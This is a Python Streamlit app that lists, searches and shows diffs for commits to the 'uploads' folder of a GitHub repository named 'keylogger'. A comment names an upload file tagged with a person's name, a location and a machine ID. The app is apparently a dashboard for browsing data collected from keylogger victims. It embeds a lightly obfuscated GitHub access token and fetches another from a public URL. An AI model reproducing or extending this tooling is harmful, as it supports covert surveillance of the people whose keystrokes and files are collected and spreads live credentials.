import streamlit as st
import requests
from datetime import datetime, timezone
import pytz
import pandas as pd
import json


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "delete" key exists
            if "delete" in token_data:
                token = token_data["delete"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'delete' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")

# GitHub API configuration
GITHUB_REPO_OWNER = "bebedudu"
GITHUB_REPO_NAME = "keylogger"
GITHUB_PATH = "uploads"
GITHUB_API_KEY = GITHUB_TOKEN  # Replace with your actual API key

def fetch_commits(page=1, per_page=50):
    headers = {
        "Authorization": f"token {GITHUB_API_KEY}",
        "Accept": "application/vnd.github.v3+json"
    }
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/commits?path={GITHUB_PATH}&page={page}&per_page={per_page}"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        st.error(f"Error fetching commits: {e}")
        return None

def time_ago(dt, timezone_name):
    try:
        user_tz = pytz.timezone(timezone_name)
    except pytz.UnknownTimeZoneError:
        user_tz = pytz.utc
    
    # Convert UTC time to user's local time
    dt_local = dt.astimezone(user_tz)
    now_local = datetime.now(user_tz)
    delta = now_local - dt_local
    seconds = delta.total_seconds()
    
    intervals = (
        ('year', 31536000),
        ('month', 2592000),
        ('week', 604800),
        ('day', 86400),
        ('hour', 3600),
        ('minute', 60),
        ('second', 1)
    )
    
    for name, seconds_in_unit in intervals:
        if seconds >= seconds_in_unit:
            count = int(seconds // seconds_in_unit)
            return f"{count} {name}{'s' if count != 1 else ''} ago"
    return "just now"

def get_client_timezone():
    # Try to get from session state first
    if 'timezone' in st.session_state:
        return st.session_state.timezone
    
    # New JavaScript injection with proper message handling
    js = """
    <script>
    function getTimezone() {
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        window.parent.postMessage({
            type: 'streamlit:setComponentValue',
            data: timezone
        }, '*');
    }
    getTimezone();
    </script>
    """
    result = st.components.v1.html(js, height=0, width=0)
    
    # Default to UTC if not set
    return 'UTC'

def display_commits(commits):
    if not commits:
        st.write("No commits found or error loading data.")
        return
    
    # Get client timezone
    timezone_name = get_client_timezone()
    
    for commit in commits:
        commit_data = commit['commit']
        author = commit_data['author']['name']
        date_utc = datetime.strptime(commit_data['author']['date'], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
        commit_sha = commit['sha']  # Get the full SHA
        commit_url = f"https://github.com/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/commit/{commit_sha}"
        
        # Convert to local time
        try:
            user_tz = pytz.timezone(timezone_name)
            local_time = date_utc.astimezone(user_tz)
            tz_abbrev = local_time.strftime('%Z')
        except pytz.UnknownTimeZoneError:
            local_time = date_utc
            tz_abbrev = 'UTC'
        
        message = commit_data['message']
        
        col1, col2 = st.columns([1.2, 4])
        with col1:
            st.markdown(f"**{author}**  \n{local_time.strftime('%Y-%m-%d %H:%M')} {tz_abbrev} - *({time_ago(date_utc, timezone_name)})*")
        with col2:
            with st.expander(message):
                st.markdown(f"**Commit SHA:**  \n`{commit_sha}`")
                st.markdown(f"[Open Commit on GitHub ↗]({commit_url})", unsafe_allow_html=True)
                
                # Add file diff visualization
                st.markdown("**File Changes:**")
                for file in commit.get('files', []):
                    st.markdown(f"📄 {file['filename']} - {file['status']} ({file['changes']} changes)")
                    if file['patch']:
                        with st.expander(f"View diff for {file['filename']}"):
                            st.code(file['patch'], language='diff')

# Updating bibek-NP-Bagmati Province-Kathmandu-1BBDF0EE-FCAA-EC11-9269-8CB87EED61E1 files_cache.json
# By bebedudu on 28/2/2025, 8:58:50 pm (committed now) - (Open commit)


def main():
    st.title("GitHub Commit History")
    
    # Initialize session state variables
    required_state = {
        'commits': [],
        'total_pages': 1,
        'page_number': 1,
        'timezone': 'UTC'
    }
    
    for key, default in required_state.items():
        if key not in st.session_state:
            st.session_state[key] = default
    
    # Initial load of first page
    if not st.session_state.commits:
        with st.spinner("Loading initial commits..."):
            initial_commits = fetch_commits(page=1)
            if initial_commits:
                st.session_state.commits = initial_commits
                st.session_state.total_pages = 1
            else:
                st.error("Failed to load initial commits. Check API access.")
                return

    # Load more commits when page changes
    if st.session_state.page_number > st.session_state.total_pages:
        with st.spinner(f"Loading page {st.session_state.page_number}..."):
            new_commits = fetch_commits(page=st.session_state.page_number)
            if new_commits:
                st.session_state.commits.extend(new_commits)
                st.session_state.total_pages += 1
            else:
                st.error(f"Failed to load page {st.session_state.page_number}")
                st.session_state.page_number -= 1  # Revert page number
                st.rerun()
    
    # Get any component value updates
    if st.session_state.get('_components', None) is None:
        st.session_state._components = {}
    
    if '_components' in st.session_state:
        if st.session_state._components.get('timezone', None):
            st.session_state.timezone = st.session_state._components['timezone']
    
    # Refresh button with callback to clear cache
    if st.button("🔄 Refresh Data"):
        st.session_state.commits = []
        st.session_state.total_pages = 1
        st.session_state.page_number = 1
        st.rerun()
    
    # Add in main()
    search_query = st.text_input("Search commits (author/message)")
    date_filter = st.date_input("Filter by commit date", [])

    # Ensure commits is always a list
    commits = st.session_state.commits if isinstance(st.session_state.commits, list) else []

    # Filter commits
    filtered_commits = [c for c in commits if 
                       (not search_query or search_query.lower() in c['commit']['message'].lower() or 
                        search_query.lower() in c['commit']['author']['name'].lower()) and
                       (not date_filter or datetime.strptime(c['commit']['author']['date'], "%Y-%m-%dT%H:%M:%SZ").date() >= date_filter[0])]
    
    # Pagination implementation
    start_idx = (st.session_state.page_number - 1) * 50
    end_idx = start_idx + 50
    paginated_commits = filtered_commits[start_idx:end_idx]
    
    # Display commits with pagination
    if st.session_state.commits:
        st.subheader(f"Recent Commits to {GITHUB_PATH} (Showing {len(paginated_commits)} of {len(filtered_commits)})")
        display_commits(paginated_commits)
        
        # Update pagination controls
        col_prev, col_mid, col_next = st.columns([1, 2, 1])
        with col_prev:
            if st.session_state.page_number > 1:
                if st.button("⏪ First Page"):
                    st.session_state.page_number = 1
                    st.rerun()
        with col_mid:
            if st.session_state.page_number > 1:
                if st.button("⬅️ Previous Page"):
                    st.session_state.page_number -= 1
                    st.rerun()
        with col_next:
            if st.button("Next Page ➡️"):
                st.session_state.page_number += 1
                st.rerun()
    else:
        st.warning("Could not load commit history. The repository might be empty or inaccessible.")



# Streamlit app
st.set_page_config(page_title="Commit History", layout="wide", page_icon=":🍥:")


# app logic to authenticate user
if st.session_state["authenticated"]:
    main()
else:
    st.error("Please login (Homepage) to access this page.")